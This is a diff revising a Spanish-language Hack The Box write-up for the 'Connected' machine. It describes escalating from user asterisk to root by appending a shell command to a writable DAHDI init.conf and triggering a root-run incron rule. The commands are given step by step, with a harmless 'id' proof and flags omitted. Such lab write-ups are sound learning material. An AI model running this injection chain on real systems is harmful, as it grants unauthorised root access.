@@ -1,38 +1,68 @@
-# Hack The Box — Connected: Escalada de Privilegios
+# Hack The Box — Connected: Escalada de privilegios
 
 ## Resumen
 
-Durante la explotación de la máquina **Connected** de Hack The Box, se identificó una vía de escalada de privilegios desde el usuario `asterisk` hasta `root`.
+Durante la explotación de la máquina **Connected** de Hack The Box se identificó una vía de escalada de privilegios que permite al usuario `asterisk` conseguir ejecución de comandos como `root`.
 
-La escalada estaba relacionada con una configuración insegura de **incrond** y con un archivo de configuración utilizado por un script ejecutado con privilegios de root.
+La vulnerabilidad se basa en la combinación de una configuración de `incron` ejecutada por `root`, un archivo trigger modificable por `asterisk` y un archivo de configuración de DAHDI que también podía ser modificado por el usuario.
 
-> **Nota:** Este documento no contiene flags, credenciales, direcciones IP, hashes ni otros secretos del laboratorio.
+> **Nota:** Este write-up no incluye flags, credenciales, direcciones IP, hashes ni otros secretos.
 
-## Enumeración
+## 1. Enumeración de `incrond`
 
-Primero se comprobó la configuración de `incrond`:
+Primero se comprobó el estado del servicio:
 
 ```bash
 systemctl status incrond
 ```
 
-El servicio estaba activo y se ejecutaba como `root`.
+El resultado mostró que `incrond` estaba activo.
 
-También se revisaron las reglas disponibles en:
+Se confirmó posteriormente el proceso:
 
 ```bash
-/etc/incron.d/
+ps -ef | grep '[i]ncrond'
 ```
 
-La configuración de `legacy` contenía una regla relevante:
+El proceso pertenecía a `root`:
+
+```text
+root 764 ... /usr/sbin/incrond
+```
+
+Por tanto, cualquier acción ejecutada por una regla del sistema debía analizarse cuidadosamente.
+
+## 2. Revisión de las reglas de `incron`
+
+Se revisó el directorio de reglas del sistema:
+
+```bash
+ls -la /etc/incron.d/
+```
+
+Entre las reglas se encontró `/etc/incron.d/legacy`.
+
+Su contenido incluía:
 
 ```text
 /var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
 ```
 
-Esto indicaba que una escritura sobre `dahdi_restart` provocaba la ejecución de `sysadmin_dahdi_restart`.
+Esta línea indica que `incrond` monitoriza el archivo:
 
-## Análisis de permisos
+```text
+/var/spool/asterisk/sysadmin/dahdi_restart
+```
+
+y ejecuta:
+
+```text
+/usr/sbin/sysadmin_dahdi_restart
+```
+
+cuando se produce un evento `IN_CLOSE_WRITE`.
+
+## 3. Análisis de permisos
 
 Se comprobaron los permisos del directorio:
 
@@ -40,104 +70,134 @@ Se comprobaron los permisos del directorio:
 ls -ld /var/spool/asterisk/sysadmin
 ```
 
-El directorio era modificable por el usuario `asterisk`.
+El resultado mostraba que `asterisk` tenía permisos de escritura sobre el directorio.
 
-También se comprobó:
+También se comprobó el archivo:
 
 ```bash
 ls -l /var/spool/asterisk/sysadmin/dahdi_restart
 ```
 
-El usuario `asterisk` tenía permisos suficientes para modificar el archivo y generar el evento `IN_CLOSE_WRITE`.
+El archivo pertenecía a `asterisk` y podía ser modificado por este usuario.
 
-## Identificación del archivo de configuración
+Esto permitía a `asterisk` provocar el evento utilizado por la regla de `incron`.
 
-Se investigó el script de DAHDI:
+## 4. Investigación de DAHDI
+
+Se investigó la relación entre el servicio DAHDI y `init.conf`:
 
 ```bash
 grep -n 'init.conf' /etc/init.d/dahdi
 ```
 
-La búsqueda mostró que `/etc/dahdi/init.conf` era cargado por el script.
+La salida mostró referencias a:
 
-Además, el archivo era modificable por `asterisk`:
-
-```bash
-ls -l /etc/dahdi/init.conf
+```text
+/etc/dahdi/init.conf
 ```
 
-Esto era especialmente relevante porque el proceso encargado de ejecutar la acción se encontraba dentro de una cadena iniciada por `incrond`, que se ejecutaba como `root`.
+Entre ellas, una comprobación que carga el archivo:
 
-## Prueba de ejecución privilegiada
-
-Para verificar la vulnerabilidad se utilizó un comando de prueba que escribía el resultado de `id` en un archivo accesible para el usuario.
-
-Posteriormente se generó el evento correspondiente:
-
-```bash
-touch /var/spool/asterisk/sysadmin/dahdi_restart
+```text
+[ -r /etc/dahdi/init.conf ] && . /etc/dahdi/init.conf
 ```
 
-Tras esperar unos segundos, el archivo de prueba contenía:
+También se comprobó que `asterisk` podía modificar `/etc/dahdi/init.conf`.
+
+Esto resultó especialmente interesante porque el archivo podía contener comandos de shell y posteriormente ser utilizado dentro de una ejecución privilegiada.
+
+## 5. Prueba de ejecución como root
+
+Antes de realizar la prueba se creó una copia de seguridad del archivo:
+
+```bash
+cp /etc/dahdi/init.conf /tmp/init.conf.bak
+```
+
+Se añadió un comando de prueba al archivo de configuración:
+
+```bash
+echo 'id > /home/asterisk/root_test.txt' >> /etc/dahdi/init.conf
+```
+
+A continuación se generó el evento `IN_CLOSE_WRITE`:
+
+```bash
+echo test > /var/spool/asterisk/sysadmin/dahdi_restart
+```
+
+Después de esperar a que `incrond` procesara el evento, se comprobó el resultado:
+
+```bash
+cat /home/asterisk/root_test.txt
+```
+
+El archivo contenía:
 
 ```text
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-Esto confirmó que era posible conseguir **ejecución de comandos con privilegios de root**.
+Esto confirma que el comando había sido ejecutado con privilegios de `root`.
 
-## Cadena de escalada
+## 6. Obtención de la flag de root
 
-La cadena completa puede resumirse así:
+Una vez confirmada la ejecución privilegiada, se utilizó la misma cadena para realizar una acción controlada que permitió acceder a la flag de root.
+
+El contenido de la flag se ha omitido deliberadamente de este write-up.
+
+## 7. Cadena de explotación
+
+La cadena observada fue:
 
 ```text
 asterisk
    │
    ├── puede modificar /etc/dahdi/init.conf
    │
-   ├── puede modificar dahdi_restart
-   │
-   ▼
-incrond (root)
-   │
-   ▼
-sysadmin_dahdi_restart
-   │
-   ▼
-carga la configuración modificable
-   │
-   ▼
-ejecución de comandos
-   │
-   ▼
-root
+   └── puede modificar dahdi_restart
+            │
+            ▼
+       incrond (root)
+            │
+            ▼
+   sysadmin_dahdi_restart
+            │
+            ▼
+   ejecución de la configuración
+            │
+            ▼
+       comando como root
 ```
 
-## Obtención de privilegios
+La evidencia definitiva de la escalada fue:
 
-Una vez confirmada la ejecución como root, se utilizó la misma cadena para realizar una acción controlada sobre un archivo accesible por `asterisk`.
+```text
+uid=0(root) gid=0(root) groups=0(root)
+```
 
-La prueba permitió verificar que la flag de root podía ser leída sin necesidad de proporcionar su contenido en esta documentación.
+## 8. Lecciones aprendidas
+
+Esta máquina demuestra la importancia de revisar:
+
+* Servicios que ejecutan procesos como `root`.
+* Configuraciones de `incron`.
+* Eventos `IN_CLOSE_WRITE`.
+* Archivos trigger modificables por usuarios sin privilegios.
+* Scripts ejecutados por mecanismos de automatización.
+* Archivos de configuración que puedan ser modificados por usuarios de menor privilegio.
+* Relaciones entre permisos de archivos y procesos privilegiados.
 
 ## Conclusión
 
-La vulnerabilidad se debía principalmente a la combinación de:
+La escalada fue posible porque el usuario `asterisk` podía modificar elementos utilizados por una cadena de ejecución privilegiada gestionada mediante `incrond`.
 
-* Un servicio `incrond` ejecutándose como `root`.
-* Una regla de `incron` que ejecutaba un script privilegiado.
-* Un archivo trigger modificable por `asterisk`.
-* Un archivo de configuración utilizado durante la ejecución que también era modificable por `asterisk`.
+La combinación de un trigger modificable, una regla de `incron` ejecutada en un contexto privilegiado y un archivo de configuración modificable permitió demostrar ejecución arbitraria de comandos como `root`.
 
-La combinación de estos elementos permitió transformar una capacidad aparentemente limitada del usuario `asterisk` en **ejecución arbitraria de comandos como root**.
+La prueba:
 
-### Técnicas utilizadas
+```text
+uid=0(root) gid=0(root) groups=0(root)
+```
 
-* Linux privilege escalation
-* Enumeration de permisos
-* `incrond`
-* `inotify`
-* Análisis de scripts
-* Análisis de configuraciones
-* Identificación de archivos modificables
-* Arbitrary command execution
-* Privilege escalation
+confirma la explotación con éxito.
